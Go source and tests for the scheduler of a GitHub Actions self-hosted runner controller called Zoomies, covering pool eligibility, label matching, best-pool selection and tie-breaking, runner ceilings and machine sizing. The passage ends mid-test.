// App installation cannot run the job whatever its labels say: Zoomies would
// mint the runner's registration in the wrong GitHub target, and the job would
// sit queued while a runner waited for it somewhere it can never be offered.
// Labels come last, because they are the only one of the three an operator
// changes by editing a workflow.
func Eligible(p *store.Pool, j *store.Job) (bool, string) {
	if p == nil || j == nil {
		return false, ""
	}
	if why := refusalBeforeLabels(p, j); why != "" {
		return false, why
	}
	if !PoolMatches(p, j.Labels) {
		return false, "the pool does not advertise those labels"
	}
	return true, ""
}

// refusalBeforeLabels is the first reason a pool cannot run a job whatever
// either of them is labelled, or "" when the labels are the only question left.
// It is Eligible's first two questions, apart so that a pass can ask them
// without asking the third.
func refusalBeforeLabels(p *store.Pool, j *store.Job) string {
	switch {
	case !p.Enabled:
		return "the pool is disabled"
	case j.InstallationID == "":
		return "no GitHub App installation here covers that repository"
	case p.InstallationID != j.InstallationID:
		return "the pool belongs to another GitHub App installation"
	}
	return ""
}

// BestPool returns the pool that best fits a job, or nil when no pool is
// eligible for it -- which the caller surfaces as a configuration problem
// rather than silently dropping the job.
//
// Ties break on pool name and then pool ID, so the same job always lands in
// the same pool. Anything else would make the controller disagree with itself
// across restarts, and make a scaling decision impossible to explain.
func BestPool(pools []*store.Pool, j *store.Job) *store.Pool {
	best, _ := bestPool(pools, j, nil)
	return best
}

// bestPool is BestPool that also explains an empty answer, given the target
// each installation manages so that the explanation can name one.
//
// The explanation names the nearest miss rather than every pool's objection.
// A job whose labels match a pool in another installation is a different
// problem from one whose labels match nothing here -- the first is a pool on
// the wrong installation, the second is a workflow asking for a machine this
// fleet does not offer -- and only the first is worth a sentence, because the
// second is what the Jobs page already says.
func bestPool(pools []*store.Pool, j *store.Job, targets map[string]string) (*store.Pool, string) {
	return bestOf(pools, nil, j, labelsOf(store.NormalizeLabels(j.Labels)), targets)
}

// preparedLabels is each pool's labels put through NormalizeLabels, in the
// order of pools, for bestOf to compare instead of normalising them again at
// every comparison. A nil pool has none.
func preparedLabels(pools []*store.Pool) [][]string {
	out := make([][]string, len(pools))
	for i, p := range pools {
		if p != nil {
			out[i] = store.NormalizeLabels(p.Labels)
		}
	}
	return out
}

// bestOf is bestPool for a job whose labels the caller has put through
// NormalizeLabels and classified (labelsOf). prepared, from preparedLabels, is
// the pools' labels put through NormalizeLabels too, for a caller that sets many
// jobs against the same pools. Nil makes bestOf normalise each pool's as it
// meets it, which is the better way to ask about one job: labels already in
// order are returned as they are, so nothing is allocated, where preparing them
// would build a slice as long as the fleet for a single comparison.
//
// It gives the answer bestPool always gave, which labels_prepared_test.go holds
// it to over a great many random fleets; what differs is how much it does to
// get there.
//
// A pass sets every queued job against every pool, so whatever one comparison
// repeats is paid jobs times pools over. Each used to normalise both sides to
// ask whether the pool was eligible, and then again, either to score it or to
// see whether it was a near miss. Labels that are already in order come back
// unchanged, but learning that means looking at every one, and that look was
// most of what a pass cost: BenchmarkDecide/burst/100pools, a thousand queued
// jobs against a hundred pools, took about 27 ms, 270 ns a pair, and takes about
// 4 ms now. A pair costs one matches call and, when the pool is eligible, one
// pass over its labels to score it.
func bestOf(pools []*store.Pool, prepared [][]string, j *store.Job, job jobLabels, targets map[string]string) (*store.Pool, string) {
	var best, elsewhere *store.Pool
	bestScore := noMatch
	for i, p := range pools {
		if p == nil || !p.Enabled {
			continue
		}
		var labels []string
		if prepared != nil {
			labels = prepared[i]
		} else {
			labels = store.NormalizeLabels(p.Labels)
		}
		if !matches(labels, job, !p.NoDefaultLabels) {
			continue
		}
		if refusalBeforeLabels(p, j) != "" {
			// A pool that would take the job but for its installation is the
			// near miss worth reporting. Ties break the same way matches do,
			// so the sentence does not change between passes.
			if elsewhere == nil || lessPool(p, elsewhere) {
				elsewhere = p
			}
			continue
		}
		s := surplusScore(labels, job.names)
		if best == nil || s > bestScore || (s == bestScore && lessPoolFor(j, p, best)) {
			best, bestScore = p, s
		}
	}
	if best != nil || elsewhere == nil {
		return best, ""
	}
	if j.InstallationID == "" {
		return nil, fmt.Sprintf("its labels match pool %s, but no GitHub App installation here covers %s", elsewhere.Name, j.Repo)
	}
	return nil, fmt.Sprintf("its labels match pool %s, which belongs to installation %s",
		elsewhere.Name, installationName(elsewhere.InstallationID, targets))
}

// installationName prefers the target an installation manages -- the
// organisation or repository an operator recognises -- and falls back to the
// identifier when the caller did not supply the targets.
func installationName(id string, targets map[string]string) string {
	if t := targets[id]; t != "" {
		return t
	}
	return id
}

// lessPoolFor is lessPool for a job that has been routed to a size class: of
// two pools that fit it equally, the one in the class it is routed to comes
// first, then a larger class and then a smaller one, nearest first, and among
// the pools of one class the architecture that is the default.
//
// A pool an operator made has no class, and sits between the pool in the right
// class and every other: where it fits a job exactly as well as the pools the
// controller keeps, it was not made for a class and has no reason to lose to
// one made for the wrong one. A job that has not been routed, which is every job
// while size routing is off, is ordered exactly as it always was.
func lessPoolFor(j *store.Job, a, b *store.Pool) bool {
	if !j.RoutedClass.Valid() {
		return lessPool(a, b)
	}
	if ra, rb := classPreference(j.RoutedClass, a), classPreference(j.RoutedClass, b); ra != rb {
		return ra < rb
	}
	if aa, ab := a.FromHosts() && a.Platform.Arch != "amd64", b.FromHosts() && b.Platform.Arch != "amd64"; aa != ab {
		return ab
	}
	return lessPool(a, b)
}

// classPreference ranks a pool for a job routed to want: 0 for the pool in that
// class, 1 for a pool no class was made for, then the larger classes in order
// and then the smaller ones.
func classPreference(want store.SizeClass, p *store.Pool) int {
	if !p.FromHosts() {
		return 1
	}
	_, have, ok := store.ParseAutoKey(p.AutoKey)
	if !ok {
		return 1
	}
	switch d := have.Rank() - want.Rank(); {
	case d == 0:
		return 0
	case d > 0:
		return 1 + d
	default:
		return 10 - d
	}
}

// lessPool is the total order used wherever two pools would otherwise tie.
func lessPool(a, b *store.Pool) bool {
	if a.Name != b.Name {
		return a.Name < b.Name
	}
	return a.ID < b.ID
}

package scheduler

import (
	"fmt"
	"math/rand/v2"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// A pass compares every queued job with every pool, so it normalises each
// side's labels once and compares those, rather than having every comparison
// normalise them, or check that it need not, for itself. That changes how the
// answer is reached and must not change the answer, which has a good many
// corners: case and spacing, duplicates, the labels every runner advertises, an
// operating system or architecture a pool declares, a pool that lists exactly
// what it has, a pool that is disabled or belongs to another installation, and
// ties.
//
// The reference below is the matching as a single comparison writes it,
// normalising both sides every time. It restates the rules rather than calling
// Eligible, PoolMatches or score, so that a change to those cannot move the
// reference with it.

// referenceLabelsMatch is the rule for one pool's labels against one job's, as it
// was written before a job's labels were classified once: a lookup in
// store.ImplicitLabels for every label at every comparison. It is restated here
// rather than called, so that changing how matches does it cannot move the
// reference with it.
func referenceLabelsMatch(pool, job []string, implicit bool) bool {
	for _, l := range job {
		if implicit && store.ImplicitLabels[l] {
			continue
		}
		if !slices.Contains(pool, l) {
			return false
		}
	}
	return !referenceContradicts(pool, job, osLabels) && !referenceContradicts(pool, job, archLabels)
}

func referenceContradicts(pool, job []string, dim map[string]bool) bool {
	if !slices.ContainsFunc(pool, func(l string) bool { return dim[l] }) {
		return false
	}
	return slices.ContainsFunc(job, func(l string) bool {
		return dim[l] && !slices.Contains(pool, l)
	})
}

func referenceMatches(p *store.Pool, jobLabels []string) bool {
	return referenceLabelsMatch(store.NormalizeLabels(p.Labels), store.NormalizeLabels(jobLabels), !p.NoDefaultLabels)
}

func referenceEligible(p *store.Pool, j *store.Job) (bool, string) {
	switch {
	case p == nil || j == nil:
		return false, ""
	case !p.Enabled:
		return false, "the pool is disabled"
	case j.InstallationID == "":
		return false, "no GitHub App installation here covers that repository"
	case p.InstallationID != j.InstallationID:
		return false, "the pool belongs to another GitHub App installation"
	case !referenceMatches(p, j.Labels):
		return false, "the pool does not advertise those labels"
	}
	return true, ""
}

func referenceScore(p *store.Pool, jobLabels []string) int {
	pool := store.NormalizeLabels(p.Labels)
	job := store.NormalizeLabels(jobLabels)
	if !referenceLabelsMatch(pool, job, !p.NoDefaultLabels) {
		return noMatch
	}
	surplus := 0
	for _, l := range pool {
		if !slices.Contains(job, l) {
			surplus++
		}
	}
	return max(exactScore-surplus, 0)
}

func referenceBestPool(pools []*store.Pool, j *store.Job, targets map[string]string) (*store.Pool, string) {
	var best, elsewhere *store.Pool
	bestScore := noMatch
	for _, p := range pools {
		if p == nil {
			continue
		}
		if ok, _ := referenceEligible(p, j); !ok {
			if p.Enabled && referenceMatches(p, j.Labels) && (elsewhere == nil || lessPool(p, elsewhere)) {
				elsewhere = p
			}
			continue
		}
		s := referenceScore(p, j.Labels)
		if s < 0 {
			continue
		}
		if best == nil || s > bestScore || (s == bestScore && lessPoolFor(j, p, best)) {
			best, bestScore = p, s
		}
	}
	if best != nil || elsewhere == nil {
		return best, ""
	}
	if j.InstallationID == "" {
		return nil, fmt.Sprintf("its labels match pool %s, but no GitHub App installation here covers %s", elsewhere.Name, j.Repo)
	}
	return nil, fmt.Sprintf("its labels match pool %s, which belongs to installation %s",
		elsewhere.Name, installationName(elsewhere.InstallationID, targets))
}

// matchingCase is one random fleet and one random job to put to it. The labels
// are written the way an operator writes them, in any case, padded, repeated
// and in any order, so that normalising has something to do.
type matchingCase struct {
	pools   []*store.Pool
	job     *store.Job
	targets map[string]string
}

func randomMatchingCase(rng *rand.Rand) matchingCase {
	vocabulary := []string{
		"self-hosted", "linux", "windows", "macos", "x64", "arm", "arm64",
		"gpu", "cuda12", "docker", "big", "small", "team-a", "team-b",
	}
	spell := func(l string) string {
		switch rng.IntN(4) {
		case 0:
			return strings.ToUpper(l)
		case 1:
			return "  " + l + " "
		}
		return l
	}
	labels := func(most int) []string {
		out := make([]string, 0, most)
		for range rng.IntN(most + 1) {
			out = append(out, spell(vocabulary[rng.IntN(len(vocabulary))]))
		}
		rng.Shuffle(len(out), func(i, j int) { out[i], out[j] = out[j], out[i] })
		return out
	}

	installations := []string{"ins_a", "ins_b"}
	names := []string{"alpha", "beta", "gamma"} // few, so that ties on name happen
	c := matchingCase{targets: map[string]string{"ins_a": "acme", "ins_b": "other"}}
	for i := range rng.IntN(7) {
		if rng.IntN(12) == 0 {
			c.pools = append(c.pools, nil)
			continue
		}
		c.pools = append(c.pools, &store.Pool{
			ID: fmt.Sprintf("pool_%d", i), Name: names[rng.IntN(len(names))],
			InstallationID: installations[rng.IntN(len(installations))],
			Labels:         labels(5), Enabled: rng.IntN(10) != 0, NoDefaultLabels: rng.IntN(4) == 0,
		})
	}
	installation := ""
	if rng.IntN(8) != 0 {
		installation = installations[rng.IntN(len(installations))]
	}
	c.job = &store.Job{ID: "job_1", Repo: "acme/widgets", InstallationID: installation, Labels: labels(5)}
	return c
}

func TestPreparedMatchingAnswersAsEveryComparisonDoes(t *testing.T) {
	rng := rand.New(rand.NewPCG(20261018, 1))
	claimed, unclaimed, nearMisses := 0, 0, 0
	for i := range 20000 {
		c := randomMatchingCase(rng)
		wantPool, wantWhy := referenceBestPool(c.pools, c.job, c.targets)

		gotPool, gotWhy := bestOf(c.pools, preparedLabels(c.pools), c.job, labelsOf(store.NormalizeLabels(c.job.Labels)), c.targets)
		if gotPool != wantPool || gotWhy != wantWhy {
			t.Fatalf("case %d: the prepared matching chose %s (%q), the reference %s (%q)\njob labels %q on installation %q\npools:\n%s",
				i, nameOf(gotPool), gotWhy, nameOf(wantPool), wantWhy, c.job.Labels, c.job.InstallationID, describePools(c.pools))
		}
		// The functions callers use keep the answer they always gave.
		if p, why := bestPool(c.pools, c.job, c.targets); p != wantPool || why != wantWhy {
			t.Fatalf("case %d: bestPool chose %s (%q), the reference %s (%q)", i, nameOf(p), why, nameOf(wantPool), wantWhy)
		}
		if p := BestPool(c.pools, c.job); p != wantPool {
			t.Fatalf("case %d: BestPool chose %s, the reference %s", i, nameOf(p), nameOf(wantPool))
		}
		for _, p := range c.pools {
			if p == nil {
				continue
			}
			gotOK, gotReason := Eligible(p, c.job)
			wantOK, wantReason := referenceEligible(p, c.job)
			if gotOK != wantOK || gotReason != wantReason {
				t.Fatalf("case %d: Eligible(%s) = %v, %q; the reference says %v, %q", i, p.Name, gotOK, gotReason, wantOK, wantReason)
			}
			if got, want := PoolMatches(p, c.job.Labels), referenceMatches(p, c.job.Labels); got != want {
				t.Fatalf("case %d: PoolMatches(%s) = %v, the reference %v", i, p.Name, got, want)
			}
			if got, want := Score(p.Labels, c.job.Labels), referenceScore(&store.Pool{Labels: p.Labels}, c.job.Labels); got != want {
				t.Fatalf("case %d: Score(%s) = %d, the reference %d", i, p.Name, got, want)
			}
		}

		switch {
		case wantPool != nil:
			claimed++
		case wantWhy != "":
			nearMisses++
		default:
			unclaimed++
		}
	}
	// A comparison that never saw a claim, a refusal and a near miss would have
	// proved nothing about the corners it was written for.
	if claimed < 1000 || unclaimed < 1000 || nearMisses < 100 {
		t.Fatalf("the generated cases claimed %d jobs, left %d unclaimed and explained %d near misses; want a spread of all three", claimed, unclaimed, nearMisses)
	}
}

// A job's labels are classified into a word, a bit for each label, and a job with
// more labels than the word has bits asks the map for the rest. Few jobs list
// sixty-eight labels, so the boundary needs a test of its own. Here linux is the
// last label the word holds, self-hosted the first it does not, x64 the next,
// and two explicit labels sort past them all.
func TestAJobWithManyLabelsIsMatchedAsEveryComparisonDoes(t *testing.T) {
	var early []string // 63 explicit labels that sort before linux
	for i := range 63 {
		early = append(early, fmt.Sprintf("a%02d", i))
	}
	late := []string{"y00", "z99"} // explicit labels that sort after x64
	explicit := append(slices.Clone(early), late...)
	every := append(slices.Clone(early), "linux", "self-hosted", "x64", "y00", "z99")
	job := queued("job_1", time.Minute, every...)
	job.Labels = store.NormalizeLabels(job.Labels)
	for label, at := range map[string]int{"linux": 63, "self-hosted": 64, "x64": 65, "y00": 66, "z99": 67} {
		if got := slices.Index(job.Labels, label); got != at {
			t.Fatalf("%s sorts at %d, want %d: the test means to straddle the 64 labels a word can classify", label, got, at)
		}
	}

	pool := func(name string, noDefaults bool, labels ...string) *store.Pool {
		p := testPool(name, labels...)
		p.NoDefaultLabels = noDefaults
		return p
	}
	without := func(labels []string, drop string) []string {
		return slices.DeleteFunc(slices.Clone(labels), func(l string) bool { return l == drop })
	}
	cases := []struct {
		name string
		pool *store.Pool
		want bool
	}{
		{"has every explicit label, and the implicit ones are not asked of it", pool("explicit", false, explicit...), true},
		{"lacks the last label, which sorts past the word", pool("missing-last", false, without(explicit, "z99")...), false},
		{"lacks an explicit label inside the word", pool("missing-first", false, without(explicit, "a00")...), false},
		{"lists exactly what the job asks, implicit labels included", pool("exact", true, every...), true},
		{"lacks linux, the last label in the word, and is asked for it", pool("no-linux", true, without(every, "linux")...), false},
		{"lacks self-hosted, the first label past the word, and is asked for it", pool("no-self-hosted", true, without(every, "self-hosted")...), false},
		{"lacks x64 and is asked for it", pool("no-x64", true, without(every, "x64")...), false},
		{"declares arm64 and the job asked for x64", pool("arm", false, append(slices.Clone(explicit), "arm64")...), false},
	}
	for _, c := range cases {
		if got := PoolMatches(c.pool, job.Labels); got != c.want {
			t.Errorf("%s: PoolMatches = %v, want %v", c.name, got, c.want)
		}
		if got := referenceMatches(c.pool, job.Labels); got != c.want {
			t.Errorf("%s: the reference says %v, want %v; the case is wrong", c.name, got, c.want)
		}
	}
	pools := make([]*store.Pool, len(cases))
	for i, c := range cases {
		pools[i] = c.pool
	}
	gotPool, gotWhy := bestPool(pools, job, nil)
	wantPool, wantWhy := referenceBestPool(pools, job, nil)
	if gotPool != wantPool || gotWhy != wantWhy {
		t.Errorf("bestPool chose %s (%q), the reference %s (%q)", nameOf(gotPool), gotWhy, nameOf(wantPool), wantWhy)
	}
}

// The controller asks about one job at a time, in loops of its own, and the
// labels it holds are the ones the store keeps, already in order. Getting the
// pools ready is worth doing for a pass that sets many jobs against them, but a
// single question that did it too would build a slice as long as the fleet at
// every call, for a comparison that has nothing to normalise.
func TestChoosingAPoolForOneJobAllocatesNothing(t *testing.T) {
	var pools []*store.Pool
	for _, label := range []string{"small", "big", "gpu"} {
		pools = append(pools, testPool(label, "self-hosted", label))
	}
	job := queued("job_1", time.Minute, "self-hosted", "big")
	job.Labels = store.NormalizeLabels(job.Labels)
	if p := BestPool(pools, job); p == nil || p.Name != "big" {
		t.Fatalf("the fleet was meant to give the job to pool big, got %s", nameOf(p))
	}

	if n := testing.AllocsPerRun(100, func() { BestPool(pools, job) }); n != 0 {
		t.Errorf("BestPool allocated %v times to choose among %d pools for one job whose labels are in order", n, len(pools))
	}
}

func nameOf(p *store.Pool) string {
	if p == nil {
		return "no pool"
	}
	return p.ID + "/" + p.Name
}

func describePools(pools []*store.Pool) string {
	var b strings.Builder
	for _, p := range pools {
		if p == nil {
			b.WriteString("  nil\n")
			continue
		}
		fmt.Fprintf(&b, "  %s enabled=%v installation=%s noDefaultLabels=%v labels=%q\n", nameOf(p), p.Enabled, p.InstallationID, p.NoDefaultLabels, p.Labels)
	}
	return b.String()
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

func TestMatches(t *testing.T) {
	tests := []struct {
		name string
		pool []string
		job  []string
		want bool
	}{
		{"exact match", []string{"gpu"}, []string{"gpu"}, true},
		{"pool is a superset", []string{"gpu", "cuda12"}, []string{"gpu"}, true},
		{"job label missing from pool", []string{"gpu"}, []string{"gpu", "cuda12"}, false},
		{"job asks only for implicit labels", []string{"gpu"},
			[]string{"self-hosted", "linux", "x64"}, true},
		{"implicit-only job and label-less pool", nil, []string{"self-hosted", "linux", "x64"}, true},
		{"label-less pool cannot serve a real label", nil, []string{"gpu"}, false},
		{"empty job labels match anything", []string{"gpu"}, nil, true},
		{"pool declares the os the job asked for",
			[]string{"linux", "gpu"}, []string{"self-hosted", "linux", "gpu"}, true},
		{"os contradiction",
			[]string{"windows", "gpu"}, []string{"self-hosted", "linux", "gpu"}, false},
		{"arch contradiction",
			[]string{"linux", "arm64", "gpu"}, []string{"self-hosted", "linux", "x64", "gpu"}, false},
		{"pool declares no arch, so any arch matches",
			[]string{"linux", "gpu"}, []string{"self-hosted", "arm64", "gpu"}, true},
		{"pool declares an arch the job did not ask for",
			[]string{"linux", "arm64", "gpu"}, []string{"self-hosted", "linux", "gpu"}, true},
		{"case and whitespace are normalised",
			[]string{" GPU ", "Cuda12"}, []string{"gpu", " cuda12"}, true},
		{"self-hosted alone never contradicts",
			[]string{"linux", "x64"}, []string{"self-hosted"}, true},
		{"duplicate labels do not change the answer",
			[]string{"gpu", "gpu"}, []string{"gpu", "GPU"}, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := Matches(tc.pool, tc.job); got != tc.want {
				t.Fatalf("Matches(%v, %v) = %v, want %v", tc.pool, tc.job, got, tc.want)
			}
			score := Score(tc.pool, tc.job)
			if (score >= 0) != tc.want {
				t.Fatalf("Score(%v, %v) = %d, which disagrees with Matches", tc.pool, tc.job, score)
			}
		})
	}
}

func TestScorePrefersTheLeastSurplus(t *testing.T) {
	job := []string{"self-hosted", "linux", "gpu"}
	exact := Score([]string{"gpu"}, job)
	oneSurplus := Score([]string{"gpu", "cuda12"}, job)
	twoSurplus := Score([]string{"gpu", "cuda12", "bigmem"}, job)

	if !(exact > oneSurplus && oneSurplus > twoSurplus) {
		t.Fatalf("scores are not ordered by surplus: exact=%d one=%d two=%d",
			exact, oneSurplus, twoSurplus)
	}
	if twoSurplus < 0 {
		t.Fatalf("a matching pool scored negative: %d", twoSurplus)
	}
	// A label the job did ask for is not surplus, even an implicit one.
	if got := Score([]string{"linux", "gpu"}, job); got != exact {
		t.Fatalf("Score with a requested implicit label = %d, want %d", got, exact)
	}
	if got := Score([]string{"windows"}, job); got >= 0 {
		t.Fatalf("Score for a contradicting pool = %d, want negative", got)
	}
}

// job is a queued job on the one installation the label tests use, so that a
// case exercises the label rule rather than the installation rule.
func job(labels ...string) *store.Job {
	return &store.Job{InstallationID: "ins_one", Repo: "acme/widgets",
		State: store.JobQueued, Labels: store.StringSlice(labels)}
}

func TestBestPool(t *testing.T) {
	general := &store.Pool{ID: "p1", Name: "general", InstallationID: "ins_one", Labels: store.StringSlice{"linux", "x64"}, Enabled: true}
	gpu := &store.Pool{ID: "p2", Name: "gpu", InstallationID: "ins_one", Labels: store.StringSlice{"linux", "x64", "gpu"}, Enabled: true}
	bigGPU := &store.Pool{ID: "p3", Name: "gpu-big", InstallationID: "ins_one", Labels: store.StringSlice{"linux", "x64", "gpu", "bigmem"}, Enabled: true}
	disabled := &store.Pool{ID: "p4", Name: "arm", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, Enabled: false}
	pools := []*store.Pool{bigGPU, disabled, gpu, general, nil}

	tests := []struct {
		name string
		job  []string
		want string
	}{
		{"implicit-only job takes the least specific pool", []string{"self-hosted", "linux", "x64"}, "general"},
		{"gpu job takes the smallest pool that has a gpu", []string{"self-hosted", "gpu"}, "gpu"},
		{"bigmem job needs the big pool", []string{"gpu", "bigmem"}, "gpu-big"},
		{"nothing claims an unknown label", []string{"windows-2022"}, ""},
		{"a disabled pool is never chosen", []string{"gpu", "arm64"}, ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := BestPool(pools, job(tc.job...))
			switch {
			case got == nil && tc.want != "":
				t.Fatalf("BestPool(%v) = nil, want %s", tc.job, tc.want)
			case got != nil && got.Name != tc.want:
				t.Fatalf("BestPool(%v) = %s, want %q", tc.job, got.Name, tc.want)
			}
		})
	}
}

func TestBestPoolTieBreaksOnName(t *testing.T) {
	// Two pools that fit the job equally well: the name decides, whatever order
	// the caller happened to pass them in.
	beta := &store.Pool{ID: "p-beta", Name: "beta", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, Enabled: true}
	alpha := &store.Pool{ID: "p-alpha", Name: "alpha", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, Enabled: true}

	for _, pools := range [][]*store.Pool{{beta, alpha}, {alpha, beta}} {
		got := BestPool(pools, job("gpu"))
		if got == nil || got.Name != "alpha" {
			t.Fatalf("BestPool = %v, want alpha", got)
		}
	}

	// Same name (only possible mid-rename) falls back to the ID.
	a := &store.Pool{ID: "p-a", Name: "same", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, Enabled: true}
	b := &store.Pool{ID: "p-b", Name: "same", InstallationID: "ins_one", Labels: store.StringSlice{"gpu"}, Enabled: true}
	if got := BestPool([]*store.Pool{b, a}, job("gpu")); got != a {
		t.Fatalf("BestPool = %v, want the lower ID", got)
	}
}

func TestEligibleAsksTheThreeQuestionsInOrder(t *testing.T) {
	pool := func(f func(*store.Pool)) *store.Pool {
		p := &store.Pool{ID: "p1", Name: "linux-x64", InstallationID: "ins_one",
			Labels: store.StringSlice{"linux", "x64"}, Enabled: true}
		f(p)
		return p
	}
	tests := []struct {
		name   string
		pool   *store.Pool
		job    *store.Job
		want   bool
		reason string
	}{
		{
			name: "a pool on the job's own installation whose labels fit takes it",
			pool: pool(func(*store.Pool) {}),
			job:  job("linux", "x64"),
			want: true,
		},
		{
			name:   "a disabled pool is refused before anything else is asked",
			pool:   pool(func(p *store.Pool) { p.Enabled = false; p.InstallationID = "ins_other" }),
			job:    job("windows"),
			reason: "the pool is disabled",
		},
		{
			name:   "a job no installation covers is refused before its labels are read",
			pool:   pool(func(*store.Pool) {}),
			job:    &store.Job{Repo: "nobody/here", Labels: store.StringSlice{"linux", "x64"}},
			reason: "no GitHub App installation here covers that repository",
		},
		{
			name:   "a pool on another installation is refused however well its labels fit",
			pool:   pool(func(p *store.Pool) { p.InstallationID = "ins_two" }),
			job:    job("linux", "x64"),
			reason: "the pool belongs to another GitHub App installation",
		},
		{
			name:   "and only then are the labels the answer",
			pool:   pool(func(*store.Pool) {}),
			job:    job("windows"),
			reason: "the pool does not advertise those labels",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			ok, reason := Eligible(tc.pool, tc.job)
			if ok != tc.want {
				t.Fatalf("Eligible = %v, want %v (%q)", ok, tc.want, reason)
			}
			if reason != tc.reason {
				t.Fatalf("reason = %q, want %q", reason, tc.reason)
			}
		})
	}
}

// A job that goes unclaimed because the pool advertising its labels is on
// another installation looks, from the Jobs page, exactly like a mislabelled
// workflow. The two need different fixes, so the plan says which it is.
func TestAnUnclaimedJobSaysWhenThePoolIsOnAnotherInstallation(t *testing.T) {
	theirs := &store.Pool{ID: "p_theirs", Name: "linux-x64", InstallationID: "ins_two",
		Labels: store.StringSlice{"linux", "x64"}, Enabled: true}
	pools := []*store.Pool{theirs}
	targets := map[string]string{"ins_two": "globex"}

	_, reason := bestPool(pools, job("linux", "x64"), targets)
	if want := "its labels match pool linux-x64, which belongs to installation globex"; reason != want {
		t.Fatalf("reason = %q, want %q", reason, want)
	}

	// Without the targets the identifier is all there is to name it by, which
	// is still better than saying nothing.
	if _, reason := bestPool(pools, job("linux", "x64"), nil); !strings.Contains(reason, "ins_two") {
		t.Fatalf("reason = %q, want it to fall back to the identifier", reason)
	}

	// A repository no installation covers is a different sentence: adding a
	// pool would not help, installing the App on that target would.
	orphan := &store.Job{Repo: "nobody/here", State: store.JobQueued, Labels: store.StringSlice{"linux", "x64"}}
	if _, reason := bestPool(pools, orphan, targets); !strings.Contains(reason, "no GitHub App installation here covers nobody/here") {
		t.Fatalf("reason = %q, want it to name the uncovered repository", reason)
	}

	// Labels that match nothing get no sentence at all: the page already says
	// no pool claims the job, and a reason repeating that is noise.
	if _, reason := bestPool(pools, job("windows"), targets); reason != "" {
		t.Fatalf("reason = %q, want none for a plain label mismatch", reason)
	}
}

package scheduler

import (
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// limits.runners is a ceiling on the whole fleet, not on a pool or a pass: it
// counts the runners already live in every pool, it is shared between pools,
// and a pool it holds back must say that it did -- otherwise the operator
// reads "the next pass will continue" about a shortfall no pass will clear.
func TestTheRunnerCeilingCountsTheWholeFleetAndSaysSoWhenItBinds(t *testing.T) {
	cases := []struct {
		name        string
		ceiling     int
		wantCreates int
		wantCeiling bool
	}{
		{"no ceiling leaves every job served", 0, 6, false},
		{"a ceiling above demand changes nothing", 20, 6, false},
		{"a ceiling below demand allows only the difference", 3, 2, true},
		{"a fleet already at its ceiling creates nothing", 1, 0, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a, z := testPool("aaa", "aaa"), testPool("zzz", "zzz")
			var jobs []*store.Job
			for _, id := range []string{"a1", "a2", "a3"} {
				jobs = append(jobs, queued(id, time.Minute, "aaa"))
			}
			for _, id := range []string{"z1", "z2", "z3"} {
				jobs = append(jobs, queued(id, time.Minute, "zzz"))
			}
			// One runner is already live in pool aaa, busy on something else:
			// it holds a place under the ceiling though it serves none of the
			// queued jobs.
			busy := testRunner("run_busy", a, store.RunnerBusy, time.Minute)
			s := snap([]*store.Pool{a, z}, []*store.Runner{busy}, jobs, []*store.Host{testHost("host_a", 16, 1)})
			s.Policy.MaxRunners = tc.ceiling

			plan := Decide(s)
			if got := countOf(plan.Actions, ActionCreate); got != tc.wantCreates {
				t.Fatalf("creates = %d, want %d", got, tc.wantCreates)
			}
			named := false
			for _, pp := range plan.Pools {
				if strings.Contains(pp.Reason, "limits.runners") {
					named = true
				}
			}
			if named != tc.wantCeiling {
				t.Fatalf("a pool's reason names limits.runners = %v, want %v: %+v", named, tc.wantCeiling, plan.Pools)
			}
		})
	}
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// dindProfilePool is the pool a live fleet rented the wrong machines for:
// docker in docker, sized by the host's profile, with a minimum of half a core
// and 1 GB a container and the daemon given 15% of a slot's memory. The thinner
// half of its memory split is the daemon's, so a slot has to be 1 GB / 0.15,
// nearly 6.7 GB, before the daemon has its gigabyte.
func dindProfilePool() *store.Pool {
	return &store.Pool{
		ID: "pool_linux", Name: "zoomies-linux-x64", Enabled: true,
		Backend: store.BackendDocker, DockerMode: store.DockerDinD, SizeFromProfile: true,
		Resources: store.Resources{MinCPUs: 0.5, MinMemoryMB: 1024, DaemonMemorySharePercent: 15},
	}
}

// smallVM is the machine that provider built: 2 vCPU and the 3915 MB a 4 GB
// guest measures itself as, cut into two slots.
func smallVM() *store.Host {
	return &store.Host{
		ID: "host_vm", Name: "vm", Capacity: 2,
		Backends: store.StringSlice{"docker"}, CPUs: 2, MemoryMB: 3915,
	}
}

// The size a refusal names has to be one placement would accept, and no
// larger than it needs to be: an operator who orders it should find the pool
// runs there, and one told to order twice what is needed stops trusting the
// number.
func TestTheMachineNamedForAPoolIsTheSmallestPlacementAccepts(t *testing.T) {
	pool, vm := dindProfilePool(), smallVM()
	if HostFits(vm, pool) {
		t.Fatal("the 3.9 GB machine fits, so there is nothing for this test to say")
	}

	need, ok := MachineFor(vm, pool)
	cpus, memoryMB := need.CPUs, need.MemoryMB
	if !ok {
		t.Fatal("no machine was named for a pool a larger machine plainly runs")
	}
	if cpus != 2 || memoryMB != 8192 {
		t.Fatalf("named %d CPUs and %d MB, want 2 CPUs and 8 GB: two cores already cover the CPU, and 6.7 GB after the reserve rounds up to 8", cpus, memoryMB)
	}
	bigger := *vm
	bigger.CPUs, bigger.MemoryMB = cpus, memoryMB
	if !HostFits(&bigger, pool) {
		t.Fatalf("the machine named, %d CPUs and %d MB, does not fit the pool either", cpus, memoryMB)
	}
	smaller := bigger
	smaller.MemoryMB -= 1024
	if HostFits(&smaller, pool) {
		t.Fatalf("a gigabyte less than the machine named still fits, so %d MB was more than the pool needs", memoryMB)
	}
}

// A machine that already fits has no size to name, and one whose agent has
// measured nothing is placed by slots alone, so there is nothing to grow.
func TestNoMachineIsNamedWhereTheHostAlreadyFits(t *testing.T) {
	for _, tc := range []struct {
		name string
		host *store.Host
	}{
